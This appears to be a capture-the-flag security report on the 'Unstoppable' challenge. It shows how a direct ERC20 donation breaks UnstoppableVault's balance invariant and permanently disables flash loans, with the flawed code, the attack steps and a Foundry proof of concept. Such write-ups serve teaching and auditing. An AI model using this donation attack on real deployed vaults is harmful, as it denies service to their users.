
# Security Report: Unstoppable

---

## 1. Vulnerability Summary

The `UnstoppableVault` contains an incorrect balance invariant check inside its `flashLoan()` function.

An attacker can transfer tokens directly into the vault without depositing through the ERC4626 interface.

This increases the vault's underlying asset balance without increasing its share supply, breaking the expected balance relationship.

Consequently, every subsequent flash loan reverts with `InvalidBalance()`, permanently disrupting the vault's flash loan functionality unless the balance discrepancy is corrected.

## 2. Affected Code

**Contract:** `UnstoppableVault.sol`  
**Function:** `flashLoan()`

```solidity
uint256 balanceBefore = totalAssets();

if (convertToShares(totalSupply) != balanceBefore)
    revert InvalidBalance();
```

### Root Cause

The contract assumes that its underlying asset balance and share supply maintain a particular relationship.

However, ERC20 tokens can be transferred directly to the vault without going through its deposit mechanism.

This allows an attacker to manipulate `totalAssets()` independently of the vault's share accounting.

The resulting inequality causes the flash loan function to revert.

## 3. Exploitation Mechanism

The attack requires no privileged permissions.

1. The attacker obtains a small amount of the underlying token.
2. The attacker transfers tokens directly to the vault using `transfer()`.
3. The vault's underlying asset balance increases without minting additional shares.
4. The attacker or another user attempts to initiate a flash loan.
5. The invariant check detects the balance discrepancy.
6. The transaction reverts with `InvalidBalance()`.

**Impact:** Flash loan functionality becomes unavailable to all users.

## 4. Proof of Concept (Foundry)

The following PoC reproduces the vulnerability.

```solidity
function test_flashTest() public {
    // Attacker donates tokens directly to the vault
    vm.startPrank(player, player);

    token.transfer(address(vault), 1e18);

    vm.stopPrank();

    // Expect the monitor to report flash loan failure
    vm.expectEmit();

    emit UnstoppableMonitor.FlashLoanStatus(false);

    vm.startPrank(deployer);

    monitorContract.checkFlashLoan(100e18);

    vm.stopPrank();
}
```

### PoC Explanation

**Step 1 – Direct Donation**

```solidity
token.transfer(address(vault), 1e18);
```

The attacker transfers `1e18` tokens directly into the vault.

No ERC4626 shares are minted, but `totalAssets()` increases.

**Step 2 – Trigger Flash Loan Check**

```solidity
monitorContract.checkFlashLoan(100e18);
```

The monitor attempts to execute a flash loan of `100e18` tokens.

**Step 3 – Invariant Failure**

The following condition evaluates to `true`:

```solidity
convertToShares(totalSupply) != balanceBefore
```

Consequently:

```solidity
revert InvalidBalance();
```

The flash loan fails, and the monitor emits:

```solidity
FlashLoanStatus(false);
```

This confirms successful reproduction of the denial-of-service condition.

## 5. Security Impact

- **Availability:** Flash loan functionality becomes unavailable.
- **Attack Requirements:** No privileged access required.
- **Attack Cost:** A relatively small direct token donation.
- **Affected Users:** All users attempting to access the vault's flash loan functionality.

## 6. Conclusion

The vulnerability originates from an incorrect accounting assumption in the flash loan balance validation mechanism.

Direct ERC20 transfers can manipulate the vault's underlying asset balance independently of its share accounting.

This breaks the invariant and causes subsequent flash loan operations to revert.

**Result:** The Foundry PoC successfully demonstrates a permissionless denial-of-service attack against the vault's flash loan functionality.
